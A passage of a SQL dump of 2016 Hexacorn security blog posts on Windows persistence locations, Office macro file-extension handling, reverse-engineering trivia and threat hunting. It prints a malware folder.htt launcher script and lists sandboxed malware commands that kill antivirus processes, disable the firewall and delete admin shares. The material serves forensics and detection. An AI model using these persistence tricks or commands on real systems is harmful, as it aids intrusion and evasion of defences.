‘IDD_SHUTDOWN_BITMAP’).\nThe winlogon developer most likely modified the source code and removed a number of things between XP, Vista and 7, but failed to remove:\n\nthe icon itself\nthe group icon resource\nand even if these 2 were meant to stay, the dev most likely removed the ‘IDD_SHUTDOWN_BITMAP’ declaration from the header file – this made the resource compiler incorporate the actual constant name into the compiled resource!\n\nAnd this is where I can come back to the typo I mentioned earlier & why is it important. What I believe happened is that the dev declared:\n#define IDD_APPLICATION_ICO <some number>\ninside the header file, but then inside the .rc file referred to the name making a typo :\nIDD_APPLICAITON_ICO ICON \"moonstars.ico\"\nResource Compiler couldn’t find the declaration of IDD_APPLICAITON_ICO and decided to treat it as a string.\nSo, it’s an unintentional data leakage in both cases as we learn about constants used in the source code \nFinally, it’s time to reveal what was the purpose of the romantic icon…\nLuckily, this is actually quite simple: by checking what other stuff can be found inside resources of winlogon.exe from XP, we can discover this dialog box definition:\nand which Resource Hacker allows us to preview as:\nThis is a dialog box that would pop up on ancient versions of Windows NT (before APM became a standard?) – luckily someone made a youtube video how it looks like so you can confirm it yourself.\nThe code referring to it is still partially present inside the winlogon.exe from Windows XP, but the dialog template is not really used after being loaded.\nThe described typos, partially removed code, and the ancient artifacts still present in Windows 10 should be a good excuse for anyone interested in reversing and forensics to explore the system internals more – fundamentally, reversing is reading other peoples’ code and bugs are a norm & knowing how tools that build programs work allow us to better understand the root cause of some of these mistakes.\nShare this :)', 'Archaeology, Reversing', 'http://www.hexacorn.com/blog/2016/11/27/the-archaeologologogology-2-the-romantic-view-as-seen-through-the-winlogon-exes-window/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (132, 'Permanent Link to 3M samples – random stats', 'Hexacorn', 'November 26, 2016 ', 'It’s been a while since I published some stats on a substantial corpora of samples, so here’s a quickie – re-visiting the compilation timestamp.\nThree things to note:\n\nthese stats are biased (I don’t have all the malware under the Sun)\nmany samples in 2015-2016 show traces of compilation tampering so compilation timestamp is no longer reliable\nmany malware samples are Delphi samples and their timestamps are wrong\n\nStill… quasi-scientific pictures are always nice to look at \n\n3M samples, excluding non-sensical timestamps (I may investigate that spike in July 2015 one day):\n\n\n\n3M samples, compilation time by the day of the month (end of the month = time to wrap it up and procrastinate):\n\n3M samples, compilation time by the day of the week (weekends are defo a thing for everyone):\n\n3M samples, compilation time by the hour (Europe is a malware cradle, apparently):\n\n3M samples, compilation time by the hour:minute (I have no idea what it shows):\n\n\nShare this :)', 'Clustering, Malware Analysis, Visualisation', 'http://www.hexacorn.com/blog/2016/11/26/3m-samples-random-stats/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (133, 'Permanent Link to Beyond good ol’ Run key, Part 51', 'Hexacorn', 'November 24, 2016 ', 'There is a number of persistence mechanisms related to Office that I have already discussed in the past, but the most obvious one – one that is actually documented – has not been covered in my posts yet. I am fixing it now \nWhen Word starts, it looks for the items inside the STARTUP folder that it can load. The older version of Office would look for files with the following extensions: .lnk, .wll (Word Add-in DLLs), or .dot  f.ex.:\n\nc:\\Program Files\\Microsoft Office\\<version>\\STARTUP\\*.dot\nc:\\Program Files\\Microsoft Office\\<version>\\STARTUP\\*.lnk\nc:\\Program Files\\Microsoft Office\\<version>\\STARTUP\\*.wll\n\nNewer versions look for additional files *.dotm and *.dotx.\nThe location above is a STARTUP folder common for all users (and it’s a WORD STARTUP persistence location #1).\nThe user-specific folder is located… well, this is where it gets interesting \nSo… Winword tries to find the following registry key:\n\nHKCU\\Software\\Microsoft\\Office\\<version>\\Word\\Options\\STARTUP-PATH\n\nf.ex.\n\nHKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Options\\STARTUP-PATH\n\nIf exists, it will read its value and treat it as a user-specific STARTUP folder. if we change it to our own, we can abuse it (WORD STARTUP persistence location #2):\n\nOtherwise… if it doesn’t exist, Word will read another Registry entry:\n\nHKCU\\Software\\Microsoft\\Office\\<version>\\Common\\General\\Startup\n\nThe default value is ‘STARTUP’, but we can change it to anything we want.\nSo, if the value is ‘Common\\General\\Startup’ default and equal ‘STARTUP’, the path will be:\n\n%APPDATA%\\Microsoft\\Word\\STARTUP (WORD STARTUP persistence #3a)\n\nBut if we change it to f.ex. TEMP, the location will be\n\n%APPDATA%\\Microsoft\\Word\\TEMP (WORD STARTUP persistence #3b)\n\nWe can try to wrap it up as follows (Word/Office 15.0):\n\nc:\\Program Files\\Microsoft Office\\Office15\\STARTUP\n%APPDATA%\\Microsoft\\Word\\STARTUP\nOR\n\nHKCU\\Software\\Microsoft\\Office\\Office15\\Common\\General\\Startup = FOOBAR\n%APPDATA%\\Microsoft\\Word\\FOOBAR\n\n\n\nExcel behaves in a similar way, except the paths and keys are (for Office 15.0):\n\nC:\\Program Files\\Microsoft Office\\Office15\\XLSTART\n%APPDATA%\\Microsoft\\Excel\\XLSTART\nOR\n\nHKCU\\Software\\Microsoft\\Office\\Office15\\Common\\General\\Xlstart = FOOBAR\n%APPDATA%\\Microsoft\\Excel\\FOOBAR\n\n\n\nHere are the Word and Excel options that dictate what are the actual user-specific %APPDATA% startup folders for both programs:\n\nThat’s all!\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response,', 'http://www.hexacorn.com/blog/2016/11/24/beyond-good-ol-run-key-part-51/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (134, 'Permanent Link to The Archaeologologogology #1 – vbd6.dll and vbe7.dll MIDI file', 'Hexacorn', 'November 23, 2016 ', 'With this post I start a new series that will talk about ancient code scrolls that are nothing, but a trivia related to some old software. Basically, a stuff of the past, re-visited without any other purpose, but the amusement…\nI will kick it off by inviting you to explore the content of vbe6.dll or vbe7.dll inside your Microsoft Office installation. Using Resource Hacker you can quickly discover that it has a mysterious resource 5432:\nUsing the very same Resource Hacker you can immediately play the music file that it recognizes. The md5 of the MIDI resource is 9b90e2e51483460501f711aa80508f7e.\nI am not the first one to discover it, there are a number of posts online that discuss it, for example this German post says that:\nIn the PC Welt (German magazine PC World) 10/02, it is reported on page 252 that there is a musical Easter egg in the Office 97 or 2000 file vbe6.dll.\nbut I was curious what code I can find that is related to this resource – pretty sure that programmers didn’t leave it there as a result of an accident. After checking the usual suspects (vbe6.dll/vbe7.dll) and not being able to find any quick reference to the resource ID 5432, I assumed that it could be some legacy stuff and no longer present in the code. I then started looking at the older versions of the vbeX.dll .\nThat was a good idea and I soon discovered the sequence of code that actually loads and plays the MIDI file:\nThe playMidi function uses mciSendCommandA API to play the extracted MIDI file.\nThe file created by the code is saved inside %TEMP%\\VB16B.tmp (GetTempFileNameA used to create a temp file path receives the ‘VB’ prefix).\nI also noticed that the code playing the MIDI creates a window (class ‘OfVbEg’, which I guess stands for Office Visual Basic Egg):\n\nSo yeah… it has the Easter egg written all over it.\nI forced the routine to execute and surely enough, it launched the VB credits – a known Easter Egg that can be watched after adding a menu item ‘Show VB Credits’ to Visual Basic IDE. You can follow the steps presented in the video in Office 97 VBA IDE as well and you will see the very same demo:\n\nI guess it just confirms how close VBA and VBE really are…\nShare this :)', 'Archaeology, Reversing', 'http://www.hexacorn.com/blog/2016/11/23/the-archaeologologogology-1-vbd6-dll-and-vbe7-dll-midi-file/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (135, 'Permanent Link to Beyond good ol’ Run key, Part 50', 'Hexacorn', 'November 8, 2016 ', 'Windows 10 has more phantom DLL files…\n(Re)starting the Print Spooler or Fax services leads to C:\\Windows\\System32\\ualapi.dll being loaded.\n \nExcept it is not always present – as far as I can tell it is only present on Windows server 2012 (can someone confirm it?) as it is responsible for providing User Access Logging (UAL) functionality.\nSo, placing a malicious C:\\Windows\\System32\\ualapi.dll on Windows 10 will lead to its execution anytime system starts (nowadays Print Spooler is started most of the time).\nOf course, writing to c:\\windows\\system32 requires admin rights.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2016/11/08/beyond-good-ol-run-key-part-50/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (136, 'Permanent Link to Beyond good ol’ Run key, Part 49', 'Hexacorn', 'November 5, 2016 ', 'I was reviewing the logs of my sandbox and came across a very old malware that was using an old-school trick as a way to increase its chances of survival – it used the desktop.ini / folder.htt combo that comes to play when the Web View is chosen for folders (XP or earlier). I know, I know.. it’s archaeology… but I checked my old posts in this series and realized I have not covered it yet, so I am fixing it now…\nAn example Desktop.ini created by the malware looks like this:\n[.ShellClassInfo]\r\nConfirmFileOp=0\r\n[{5984FFE0-28D4-11CF-AE66-08002B2E1262}]\r\nPersistMoniker=file://Folder.htt\r\n[ExtShellFolderViews]\r\n{5984FFE0-28D4-11CF-AE66-08002B2E1262}={5984FFE0-28D4-11CF-AE66-08002B2E1262}\nand the associated folder.htt like this:\n<html>\r\n<head>\r\n<meta http-equiv=\"content-type\"content=\"text/html; charset=Windows-1252\">\r\n</head>\r\n<body style=\"margin: 0\" scroll=no>\r\n<object id=FileList border=0 tabindex=1\r\nclassid= \"clsid:1820FED0-473E-11D0-A96C-00C04FD705A2\"\r\nstyle=\"width: 100; height: 100\" tabIndex=-1>\r\n</object>\r\n</body>\r\n</html>\r\n<script>\r\nobjectstr=\"<OBJECT ID=\\\"RUNIT\\\" WIDTH=0 HEIGHT=0 TYPE=\\\"application/x-oleobject\\\"\"\r\nobjectstr+=\"CODEBASE=\\\"Mr_CF.pif#version=1,1,1,1\\\">\"\r\nobjectstr+=\"<PARAM NAME=\\\"_Version\\\" VALUE=\\\"65536\\\">\"\r\nobjectstr+=\"</OBJECT>\"\r\nobjectstr+=\"<HTML><H1></H1></HTML>\";\r\ndocument.writeln(objectstr);\r\ndocument.close();\r\n</script>\nThere is not much more I can write here… this is super old-school and I am just adding it for completeness.\nShare this :)', 'Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response, Malware Analysi', 'http://www.hexacorn.com/blog/2016/11/05/beyond-good-ol-run-key-part-49/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (137, 'Permanent Link to Office Macros – file extensions, file format (content), and a few handling stereot', 'Hexacorn', 'November 5, 2016 ', 'Macromalware is omnipresent. It’s ironic, given the fact it was dormant for so many years… We can only guess that its renaissance can be attributed to the fact the number of internet users increased tremendously since early 2000s and pretty much all of them are not security specialists – as such are more gullible to fall a victim of many of the social engineering tricks employed by the malware authors…\nUpdate: Regarding the reason for the renaissance of the macro viruses: after I posted this piece Dr Vesselin Bontchev (Vess) – the renowned antivirus researcher and one of the best experts in VBA analysis – offered an alternative explanation. It is pretty interesting: not only it’s convincing, but also highlights the fact the ‘security notifications’ offered by software (AV, Office, browsers, etc.) often do more harm than help. In our quick Twitter convo Dr Vesselin Bontchev mentioned that:\n\nIn Office 2000 Microsoft made a change that killed macro malware. By default, it would IGNORE macros not signed with trusted key. No notification, nothing. As if the macros didn’t exist. Killed macro malware flat (and it was very prevalent at the time). Sadly, later versions of Office started showing notifications, like the dreaded “Enable content” button. Macro malware came back.\n\nIsn’t that amazing? I am in security business for a while, and I do ignore and get annoyed by all these nagging notifications. I don’t read most of them anymore and tend to click stuff to just ‘get it out of my way’. What about your average computer user? It’s UI fail that drives the security fail.\nIn this post I don’t want to analyze any malware, and I don’t want to talk about evasion, obfuscation, etc.\nI want to talk about the file extension, file format, and how this thing is being perceived as ‘handled’ and… how it is really handled.\nYou see, I believe there exists a couple of misconceptions about the macrodocuments. One is that Office files are labeled as such by their file extensions. This is very true, but I want to show that this misconception opens a few more new paths the macrodocuments can enter the systems of the victims in the future…\nMisconception #1\nThe macro document needs to be stored in a file with an extension .docm, .xlsm, etc. to work\nUsing these file extensions doesn’t hurt, but macrodocuments can be stored inside .doc or .xls files as well. So, blocking .docm, .xlsm, etc. file attachments won’t stop all the macrodocuments.\nMisconception #2\nBlocking the macro-specific attachments is a good solution to prevent the delivery of macro documents.\nThis is true in many cases, but it omits one fact: Office is very err… flexible :).\nYou can run the following commands to see what files are associated with Office programs on your system:\n\nassoc | findstr /i “word”\nassoc | findstr /i “excel”\nassoc | findstr /i “powerp”\n\n(these are not all, btw.)\nHere’s an example result:\n\nassoc | findstr /i “word”\n\n.doc=Word.Document.8\n.dochtml=wordhtmlfile\n.docm=Word.DocumentMacroEnabled.12\n.docmhtml=wordmhtmlfile\n.docx=Word.Document.12\n.docxml=wordxmlfile\n.dot=Word.Template.8\n.dothtml=wordhtmltemplate\n.dotm=Word.TemplateMacroEnabled.12\n.dotx=Word.Template.12\n.odt=Word.OpenDocumentText.12\n.rtf=Word.RTF.8\n.wbk=Word.Backup.8\n.wiz=Word.Wizard.8\n.wll=Word.Addin.8\n\n\nassoc | findstr /i “excel”\n\n.csv=Excel.CSV\n.ods=Excel.OpenDocumentSpreadsheet.12\n.slk=Excel.SLK\n.xla=Excel.Addin\n.xlam=Excel.AddInMacroEnabled\n.xld=Excel.Dialog\n.xlk=Excel.Backup\n.xll=Excel.XLL\n.xlm=Excel.Macrosheet\n.xls=Excel.Sheet.8\n.xlsb=Excel.SheetBinaryMacroEnabled.12\n.xlshtml=Excelhtmlfile\n.xlsm=Excel.SheetMacroEnabled.12\n.xlsmhtml=excelmhtmlfile\n.xlsx=Excel.Sheet.12\n.xlt=Excel.Template.8\n.xlthtml=Excelhtmltemplate\n.xltm=Excel.TemplateMacroEnabled\n.xltx=Excel.Template\n.xlw=Excel.Workspace\n.xlxml=Excelxmlss\n\n\nassoc | findstr /i “powerp”\n\n.odp=PowerPoint.OpenDocumentPresentation.12\n.pot=PowerPoint.Template.8\n.pothtml=powerpointhtmltemplate\n.potm=PowerPoint.TemplateMacroEnabled.12\n.potx=PowerPoint.Template.12\n.ppa=PowerPoint.Addin.8\n.ppam=PowerPoint.Addin.12\n.pps=PowerPoint.SlideShow.8\n.ppsm=PowerPoint.SlideShowMacroEnabled.12\n.ppsx=PowerPoint.SlideShow.12\n.ppt=PowerPoint.Show.8\n.ppthtml=powerpointhtmlfile\n.pptm=PowerPoint.ShowMacroEnabled.12\n.pptmhtml=powerpointmhtmlfile\n.pptx=PowerPoint.Show.12\n.pptxml=powerpointxmlfile\n.pwz=PowerPoint.Wizard.8\n.sldm=PowerPoint.SlideMacroEnabled.12\n.sldx=PowerPoint.Slide.12\n\n\n\nNow that we know potential file extensions, we can create a simple macro document and create its copies with the respective file extensions to see which of these clones will – when opened – execute macro.\nFor the WinWord, I saved a file in a new Office format .docm and then copied the file to have the very same file, just with different extensions. I also enabled the macros to ensure I can test it w/o warnings and quickly. Then I opened them one by one from Windows Explorer. Many of them didn’t work, but some of them did…\nFiles with these extensions executed the AutoOpen macro:\n\n.doc\n.docm\n.rtf\n.wbk\n\nAdditionally, Office ‘complained’ about these formats:\n\n.docx, .odt\n\n\nUpdate: after I posted this, Vess created a nice POC showing that it is possible to bypass it by downloading and executing macro hidden inside a remote template file linked to a .docx file – the demo can be found here.\n\n.dotm, .dotx\n\n\n \nThe very same experiment can be repeated with the WinWord macrodocument saved in the old OLE format, as well as Excel workbooks, PowerPoint presentations (new and old formats), and other files from the Office package.\nI guess we can agree that the .rtf and .wbk extensions are a bit of a surprise… You will find some more surprises with Excel files. I strongly encourage you to experiment on your own – this is why I do not post all the results (I went through all file extensions I could find, it’s worth it!).\nMisconception #3\nThe file handling is determined by its file extension.\nOf course, we have already disproven it in the previous section. Office is a clever cookie and it tries to determine what the file is by its file format (by reading file content). This is why .rtf, and .wbk files open and execute macros even if they are not truly RTF or WBK formats.\nThere is more.\nIf you rename your macrodocument to have a completely different file extension f.ex. .foobar, or even none at all… you will still be able to run the macros – the only trouble is forcing the user to drag&drop the doc to Office application (or open it in some other way), but this is just a social engineer’s child play, given so much evidence showing what efforts user make today to run macros…\nMisconception #4\nBlocking macrodocuments = blocking attachments.\nIn the previous points we have demonstrated that we can bypass this attachment block by using a non-standard file extension.\nAlso, need to highlight that the actual macro code is embedded _inside_ the attachments. As long as the malware author can force the user to open the attachment, Word will recognize the macro code inside the attached file and it will execute it.\nMisconception #5\nWe must block macros in the whole company.\nI actually agree with that and it’s not a misconception per se. But the assumption it is easy certainly is.\nThe problem is that this is an extremely difficult, often practically impossible task, and first and foremost – a subject to a lot of testing and politics beforehand:\n\nYou are not blocking in one place, but in many places – diff. setups/configurations across many countries (politics&technology)\nPeople still use VBA a lot (especially in Excel)\n\nfor business\nfor admin tasks\nfor learning purposes\nfor whatever else reason… they really do… there is still a huge community of VBA programmers and these individuals work for many large orgs; can’t just disable their toy w/o causing a lot of issues\n\n\nApart from blocking, you need to ensure people cannot re-enable it\nAnd last but not least… the ownership of change management\n\nIt’s perhaps less obvious, but enabling will happen sooner or later; in such cases exclusions are often added first per user, but as there is more and more demand and less and less time – per business unit, and larger user groups; some may be even done on emergency basis (customer sent a report that relies on VBA, and you just need to see it ASAP); over years this may create a significant user group with the macros enabled…\n\n\n\nShare this :)', 'Incident Response', 'http://www.hexacorn.com/blog/2016/11/05/office-macros-file-extensions-file-format-content-and-a-few-handling-stereotypes/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (138, 'Permanent Link to Beyond good ol’ Run key, Part 48', 'Hexacorn', 'October 21, 2016 ', 'I have just updated my very old post about HKLM\\SOFTWARE\\Microsoft\\VBA\\Monitors. I discovered its additional ‘properties’ while looking at the VBE (Visual Basic Engine). On the way, I have also discovered that Visual Basic for Application’s old-school IDE allows programmers to create Add-ins. A quick googling followed and I immediately found a number of Addins for VBE – I was actually quite surprised that there are so many!\nSeriously, there is a huge interest in it! With all the C, Java, python programmers out there… it would seem that VBA is strong and here to stay…\nSo, anyway… I didn’t spend much time on it as many programmers already provide good examples of VBE Add-ins, so I will just document where to find the possible persistence entries.\nThe Add-ins are discovered by VBE by enumeration of the following key:\n\nHKCU\\Software\\Microsoft\\VBA\\VBE\\6.0\\Addins\\<AddInName>\\…\n\nEach Add-in has a dedicated subkey where it lists the properties:\n\nDescription – Full description\nFriendlyName – Short name\nLoadBehavior – A DWORD that indicates whether the Add-in is loaded at startup (1), is currently unloaded (0)\nSatelliteDllName + SatelliteDllPath  – references to localized information about the plug-in\n\nSo, anyone wanting to load the VBE Add-in needs to set up the Registry key with the aforementioned values, and then create the appropriate entries under HKCR:\n\nHKCR\\<AddInName>\\Clsid = <GUID>\nHKCR\\CLSID\\{<GUID>}\\InprocServer32 = …\n\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Forensic Analysis, Incident Response, Malware Analysis', 'http://www.hexacorn.com/blog/2016/10/21/beyond-good-ol-run-key-part-48/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (139, 'Permanent Link to The cyberchild of Omelas, Quick Addendum', 'Hexacorn', 'October 18, 2016 ', 'In the first part I claimed a number of things about the ‘Simpsons already did’ phenomenon, but I realize that w/o a solid proof, it is just trolling. I had a few minutes on my hands and googled around for the evidence for at least some of the claims made by yours truly  It was not hard, because I remembered many of the cases I referred to and it was just a matter of finding and linking to them…\n1992 –  http://docs.lib.purdue.edu/cgi/viewcontent.cgi?article=1982&context=cstech\nVirus monitors/detection by behavioral abnormality In this approach to virus detection, the machine is booted from uninfected files and a virus monitor is installed that monitors vari0us activities of the machine while in day-to-day use. The program monitors known methods of virus activity including attempts to infect and evade detection. 1his may also include attempts to write to boot sectors. modify interrupt vectors. write to system files. etc.\n1998 – https://www.symantec.com/region/can/eng/press/1998/n980519.html\nIBM’s anti-virus technology, part of the IBM SecureWay comprehensive portfolio of security offerings, has been awarded six patents for inventions, ranging from a neural network that uses artificial intelligence to detect new viruses automatically to the immune system itself. IBM is the first company to develop an immune system that can detect previously unknown viruses, analyse them, and distribute a cure worldwide, all automatically and within minutes of first discovering new viruses.\n2000 – http://vxheaven.org/lib/awa01.html\nAutomatically generated Win32 heuristic virus detection\nHeuristic classifiers which distinguish between uninfected and infected members of some class of program objects have usually been constructed by hand. We automatically construct multiple neural network classifiers which can detect unknown Win32 viruses, following a technique described in previous work (Kephart et al, 1995) on boot virus heuristics.\nThese individual classifiers have a false positive rate too high for real-world deployment. We find that, by combining the individual classifier outputs using a voting procedure, the risk of false positives is reduced to an arbitrarily low level, with only a slight increase in the false negative rate. Regular heuristics retraining on updated sets of exemplars (both infected and uninfected) is practical if the false positive rate is low enough.\nPlus, many articles listed here http://vxheaven.org/lib/?lang=en&index=AT.\nAnd then there are patents…\n1992 – US 5319776 A – http://www.google.co.uk/patents/US5319776\nIn transit detection of computer virus with safeguard\nData is tested in transit between a source medium and a destination medium, such as between two computer communicating over a telecommunications link or network. Each character of the incoming data stream is tested using a finite state machine which is capable of testing against multiple search strings representing the signatures of multiple known computer viruses. When a virus is detected the incoming data is prevented from remaining on the destination storage medium. Both hardware and software implementations are envisioned.\n1997 – US 5842002 A – https://www.google.com/patents/US5842002\nComputer virus trap\nA computer virus trapping device is described that detects and eliminates computer viruses before they can enter a computer system and wreck havoc on its files, peripherals, etc. The trapping device creates a virtual world that simulates the host computer system intended by the virus to infect. The environment is made as friendly as possible to fool a computer virus into thinking it is present on the host, its intended target system. Within this virtual world, the virus is encouraged to perform its intended activity. The invention is able to detect any disruptive behavior occurring within this simulated host computer system. It is further able to remove the virus from the data stream before it is delivered to the host and and/or take any action previously instructed by a user.\n1997 – US 6167520 A – https://www.google.com/patents/US6167520\nSystem and method for protecting a client during runtime from hostile downloadables\nA system and method examine execution or interpretation of a Downloadable for operations deemed suspicious or hostile, and respond accordingly. The system includes security rules defining suspicious actions and security policies defining the appropriate responsive actions to rule violations. The system includes an interface for receiving incoming Downloadable and requests made by the Downloadable. The system still further includes a comparator coupled to the interface for examining the Downloadable, requests made by the Downloadable and runtime events to determine whether a security policy has been violated, and a response engine coupled to the comparator for performing a violation-based responsive action.\nShare this :)', 'Preaching', 'http://www.hexacorn.com/blog/2016/10/18/the-cyberchild-of-omelas-quick-addendum/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (140, 'Permanent Link to The Threat Hunting -> the anomaly hunting -> the data eyeballing', 'Hexacorn', 'October 16, 2016 ', 'In my last post I described my opinion about current state of affairs of the fashionable IR trend called threat hunting. Since I am advocating it myself for a number of years I probably shoot myself in a foot by being openly critical about its potentials, but if there is one way for this discipline to progress it is to question your own doing…\nSince I posted it I received a rebuttal from Jack Crook and a couple of answers on Twitter. Jack’s rebuttal starts by hinting at my inexperience in a field and then goes all the way to promote the very wishful thinking that I decided to criticize. The simple answer to Jack’s post is this: theory vs. practice. The fundamental problem of threat hunting is not how we detect specific things, or how we generate better ideas how to correlate data for specific cases. This is easy. Once you have that data, that correlation engine in place and that specific idea – you just implement it. It is a simple engineering work. The ‘fun’ begins afterwards – the tweaking. When I brought up a couple of examples of potential (but naive) threat hunting rules that could be used to detect badness in the environment, it was not to highlight them as examples of rules that could be potentially improved. We can always do so, and can/should look at more holistic way these events correlate with each other. I agree, I actually do, because I practice it too and quite a lot. Yet, I don’t want these two points I made to be missed:\n\nThe threat hunting _is_ signature writing. How far is it from IOCs, yara and lo and behold – virus signatures? And we know it doesn’t work.\nThe error of availability makes us a subject to naive assumptions – one that complex correlations will help us to get rid of False Positives easily (which we are not aware of until we test it on large corpora of data)\n\nI have already covered the signature writing, let me discuss the error of availability a bit more. We write rules for what we have seen (btw. antivirus works the same, reactive way). Our exposure to the knowledge about BAD actors and behaviors is limited, but we are getting better and better at it. Yet I can bet that neither you nor myself know, or remember all the tricks of the trade. Will your threat hunting cover everything? Does it cover everything inside the Rtfm-Red-Team-Field-Manual and Post Exploitation Wiki? I published over 40 posts about various persistent mechanisms in last couple of years – I bet most of the threat hunters do NOT look at these cases (full disclosure: I don’t). The avalanche of clever tricks developed by SubTee is definitely NOT covered by most of us either. Add to it the variations of OS commands, tools, various WMI, kiosk-escape, pentesting kung-fu trickery, and also unpublished research, and a few thousands blogs one would need to follow (and constantly discover new ones: don’t forget Chinese, Korean, Arabic, Spanish, etc. blogospheres) to stay on top of things and you know that we would still be behind. I did mention before that we want to detect the insider threat too. Wishful thinking it is.\nBut let’s – for the sake of the argument – assume that we read all blogs, APT reports, did our homework and collected all the trickery in our head and we know what to hunt for. Here comes the error of availability number two – our exposure to the knowledge about GOOD actors and behaviors. It is extremely limited. And it is the latter that makes the Threat Hunting extremely challenging. Because while we successfully leverage our (limited) knowledge about the BAD guys, most of the time we completely ignore the one about the GOOD guys. Once we apply this approach in practice, the False Positives show up immediately. I have already listed a number of examples of GOOD actors’ behaviors in my previous posts. If you simply ignore them in a discussion then I suspect you don’t have the exposure to a corpora of real security events from a large organization. Support/Admin scripts often launch a number of lateral movement tools one by one, people use Excel and Word to launch cmd.exe, and other tools, the enterprise solutions use psexec, autoruns, cmd, cscript, xcmd, nmap, WMI, MSI, they load drivers, create scheduled tasks, services, google chrome with its updates is a ‘nice’ event generator, people use crazy number of variants of putty, kitty, ssh, winscp placed all over their systems, they download files using wget, curl, even bitsadmin is used either by good guys, or by software, then there is cygwin, a number of users learning hacking in-house, and so on and so forth… Having a tree and ability to correlate the events is often NOT enough. The sad truth is that behaviors of BAD and GOOD guys are often indistinguishable!\nThe lack of public data for researchers’ consumption is a problem in this space and one that can be hopefully addressed one day. The threat hunting discussions need to be very data-specific. Threat hunting today is data eyeballing. Just saying that ‘we need to look at better rules or correlations and leverage our knowledge about bad actors’ is simply vague. And vague Threat Hunting cannot be. I guess it’s really time to engage data scientists.\nBeing critical is constructive only if we discuss next steps. I believe that there is a list of must-do things for any threat hunter – they may act as an eye opener:\n\nLook at clusters of events generated across large environment (not just one or a few system)\n\nany event related to execution of wmic.exe, powershell.exe, cscript.exe, wscript.exe, mshta.exe, and pretty much any legitimate .EXE from the OS\nany event related to loading of pretty much any .DLL\n\n\nLook at clusters of commands intercepted from sandboxing of large malware samplesets\n\nHere I can help with some real data\n\nHow would you discover chrome.exe dropped shown in these events?\nWhat rule could you write to discover variants of svchost.exe ?\nHow would you detect artifacts dropped by APT1 set?\n\n\n\n\nRead as much as you can not only about new malware and hacking tricks, but also about architecture of the OS, and… programming manuals, including the OLD school stuff like Win32API, COM, DDE, etc. (I am very Windows-specific in this post, but same applies to other OSes)\nPromote science of data analysis – I am personally way behind and feel there is a need to get better at it\n\nLast, but not last…here’s a couple of questions to highlight the ambiguities you may come across:\n\nIs a parent-child relationship between the following processes a sign of malicious activity?\n\nsvchost.exe -> iexplore.exe\n\n\nWhat about this one?\n\nsvchost.exe -> winword.exe\n\n\nAnd this one?\n\ncmd.exe -> cscript.exe -> nmap.exe\n\n\nAnd this one?\n\n<Non-existent process (70564)> -> cmd.exe -> putty.exe\n\n\nWhat events are triggered when you launch a new process via WMI?\n\nIs the detection of processes opened this way a good threat hunting rule?\n\n\nIs injection of a remote thread into a foreign process (via CreateRemoteThread API) always a sign of malicious activity ?\nThe see 50 systems with a number of events indicating randomly named DLLs were loaded from the %TEMP% folder – would you consider it a malicious activity?\nYou find traces of radmin, logmein, team viewer executed on a number of systems; would you consider them a malicious activity? (bonus question: how would you codify a Business Unit-specific case)\nIs modification of  c:\\WINDOWS\\system32\\drivers\\etc\\hosts an alertable event?\nFinally, since I mentioned we need to be specific and talk about real data – here’s a top of the list from the histogram of commands executed by malware samples  – I generated it over 2 years ago from a decent cluster of sandboxed samples – which ones would you say are bad? Let me remind you – most of them are associated with malicious activity one way or another… but are they?\n\n  69830 cmd /c at\r\n  69829 cmd /c rmdir\r\n  69829 cmd /c attrib -s -h -r\r\n  21710 msiexec /i \r\n  18872 ipconfig /all\r\n  10859 cmd /q\r\n   8367 cmd /c del \r\n   8055 regsvr32 /s \r\n   7520 cmd /c \r\n   6906 msiexec /quiet /i \r\n   6227 net share admin$ /delete /y\r\n   6226 net share ipc$ /delete /y\r\n   6225 net share d$ /delete /y\r\n   6221 net share c$ /delete /y\r\n   5307 ipconfig /renew\r\n   5264 regsvr32  /s  \r\n   5177 ipconfig /release\r\n   3783 taskkill /f /im zhudongfangyu.exe\r\n   3428 taskkill /f /im explorer.exe\r\n   3373 reg add hklm\\system\\currentcontrolset\\control\\terminal\" \"server\\winstations\\rdp-tcp /v portnumber /t reg_dword /d \r\n   3371 reg add hklm\\system\\currentcontrolset\\control\\terminal\" \"server\\wds\\rdpwd\\tds\\tcp /v portnumber /t reg_dword /d \r\n   3254 taskkill /f /im firefox.exe\r\n   3207 cmd /c reg add hklm\\system\\currentcontrolset\\services\\sharedaccess\\parameters\\firewallpolicy\\standardprofile\\authorizedapplications\\list /v \"\r\n   3013 taskkill /f /im wmplayer.exe\r\n   2996 taskkill /f /im winamp.exe\r\n   2987 taskkill /f /im iexplorer.exe\r\n   2981 taskkill /f /im ansav.exe\r\n   2977 taskkill /f /im winampa.exe\r\n   2977 taskkill /f /im pcmav-cln.exe /im pcmav-rtp.exe\r\n   2977 taskkill /f /im ansavgd.exe\r\n   2961 regsvr32 /s /u \r\n   2683 cmd /c rd \r\n   2496 cmd /c net stop sharedaccess\r\n   2404 regsvr32 /u /s \r\n   2399 cmd /c reg add hklm\\system\\currentcontrolset\\services\\sharedaccess\\parameters\\firewallpolicy\\standardprofile /v \"donotallowexceptions\" /t reg_dword /d \"0\" /f\r\n   2356 regsvr32 /u \r\n   2088 cmd /c net stop wscsvc\r\n   2082 taskkill /f /t /im zhudongfangyu.exe\r\n   1988 gpupdate /force\r\n   1954 reg delete hkey_current_user\\software\\microsoft\\windows\\currentversion\\explorer\\runmru /f\r\n   